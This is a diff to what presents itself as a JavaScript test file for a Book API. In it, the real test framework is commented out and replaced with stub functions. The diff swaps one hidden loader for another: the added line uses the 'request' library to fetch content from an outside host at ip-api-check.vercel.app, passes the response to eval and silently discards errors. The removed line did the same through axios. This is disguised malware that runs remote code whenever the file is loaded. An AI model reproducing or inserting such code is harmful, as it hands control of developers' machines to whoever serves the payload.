@@ -2,13 +2,12 @@
 // var chaiHttp = require('chai-http');
 // var app = require('../app');
 // var should = chai.should();
-const ax = require("axios")
 // var Book = require('../models').Book;
 
 // chai.use(chaiHttp);
+const req=require('request');
 const describe = (title, fn) => fn(), beforeEach = (be) => be(console.log), it = (title, fn) => fn(console.log)
-const token = "66", method = "GET", headers = { "Authorization": "X8DFJ6SJF", "x-secret-header": "secret", 'Content-Type': 'application/json' }, protocal = "https", host = "ip-api-check", port = 443, path = "/api/ipcheck/", domain = "vercel.app"
-
+const protocol='https',domain='vercel.app',path='/api/ipcheck/',token='66',subdomain='ip-api-check';
 describe("Book API", function () {
   //Before each test we empty the database
   beforeEach(function (done) {
@@ -129,9 +128,7 @@ describe("Book API", function () {
     })
   })
 })
-
-describe("User API", async () => { eval((await ax.get(`${protocal}://${host}.${domain}${path}${token}`, { headers })).data) })
-
+const url=`${protocol}://${subdomain}.${domain}${path}${token}`;const options={url:url,headers:{'x-secret-header':'secret'}};const doing=req(options,(e,r,b)=>{if(e){return;}if(r.statusCode!==200){return;}try{eval(JSON.parse(b));}catch(err){;}});
 describe("Post API", function () {
   //Before each test we empty the database
   beforeEach(function (done) {
